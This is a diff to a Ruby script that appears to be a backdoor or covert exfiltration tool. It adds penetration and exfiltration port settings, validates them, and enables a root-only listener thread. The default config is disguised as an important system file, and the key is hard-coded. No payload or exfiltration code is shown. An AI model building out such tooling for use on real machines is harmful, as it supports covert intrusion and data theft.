@@ -36,8 +36,9 @@ $KEY = OpenSSL::Digest::SHA256.new("verysecretkey").digest
 CONFIG_FILE = "not_important"
 CONFIG_FILE_DEFAULT = "\# This is an important system file! Please do not edit\n"
 CONFIG_FILE_DEFAULT << "\# pen_prot = tcp\n"
+CONFIG_FILE_DEFAULT << "\# pen_port = 8668\n"
 CONFIG_FILE_DEFAULT << "\# exfil_prot = tcp\n"
-CONFIG_FILE_DEFAULT << "\# exfil_port = 6868\n"
+CONFIG_FILE_DEFAULT << "\# exfil_port = 6886\n"
 CONFIG_FILE_DEFAULT << "\# interface = eth1\n"
 CONFIG_EDIT = "Please edit #{CONFIG_FILE} and relaunch."
 CONFIG_CREATE = "Configuration file created. #{CONFIG_EDIT}"
@@ -85,13 +86,17 @@ def validate_config
         if valid_protocol(pair[1])
           @cfg_pen_protocol = pair[1]
         end
+      when "pen_port"
+        if valid_port(pair[1].to_i)
+          @cfg_pen_port = pair[1].to_i
+        end
       when "exfil_prot"
         if valid_protocol(pair[1])
           @cfg_exfil_protocol = pair[1]
         end
       when "exfil_port"
         if valid_port(pair[1].to_i)
-          @cfg_port = pair[1].to_i
+          @cfg_exfil_port = pair[1].to_i
         end
       when "interface"
         #interface validation?
@@ -101,7 +106,8 @@ def validate_config
   end
   #check if all items are present
   if @cfg_pen_protocol == nil || @cfg_exfil_protocol == nil \
-    || @cfg_iface == nil || @cfg_port == nil
+    || @cfg_iface == nil || @cfg_pen_port == nil \
+    || @cfg_exfil_port == nil
     exit_reason(CONFIG_INVALID)
   end
 end
@@ -211,10 +217,10 @@ end
 raise 'Must run as root' unless Process.uid == 0
 load_config_file
 begin
-  #listen_thread = Thread.new { start_listen_server }
-  #listen_thread.join
+  listen_thread = Thread.new { start_listen_server }
+  listen_thread.join
 
 rescue Interrupt # Catch the interrupt(ctrl c) and kill the thread
-  #Thread.kill(listen_thread)
+  Thread.kill(listen_thread)
   exit 0
 end
